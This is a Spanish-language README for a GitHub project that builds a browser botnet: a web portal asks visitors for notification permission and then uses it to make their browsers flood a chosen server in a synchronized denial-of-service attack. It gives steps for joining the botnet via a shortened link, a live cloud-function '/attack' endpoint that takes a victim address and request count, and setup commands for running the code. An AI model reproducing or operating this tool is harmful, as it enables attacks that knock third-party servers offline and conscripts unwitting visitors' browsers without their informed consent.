# BOTNET

### Objetivo

El objetivo planteado es el de, utilizando algunas de las herramientas de manejo de asincronicidad de Javascript, lograr implementar un botnet funcional. Se espera lograr que un portal web, cuyo contenido no es de extrema importancia, pida al usuario permiso para enviarle notificaciones. Posteriormente, se usará dicho permiso para enviarle tareas como podría ser la de enviar un número grande de solicitudes a un servidor en poco tiempo para lograr, sincronizando todos los clientes, un potente ataque de negación de servicio.

### Para probar

1. Entrar en el [portal](http://bit.ly/2PtISW8)
2. Aceptar las notificaciones
3. Abrir la consola de desarrollador del navegador. Si aparece el mensaje Success quiere decir que todo va bien
4. Enviar una solicitud POST a https://us-central1-botnet-eb509.cloudfunctions.net/attack con un cuerpo de tipo
``` typescript
  {
    victim: string,
    requests: number
  }
```
5. Mirar la consola en el navegador, si no pasa nada, refrescar el portal y enviar nuevamente la solicitud

### Como usar el codigo de este repositorio

```
git clone https://github.com/mrnkr/botnet.git
cd botnet/
npm install
npm run dev # Inicia un servidor de prueba con el portal cliente
```
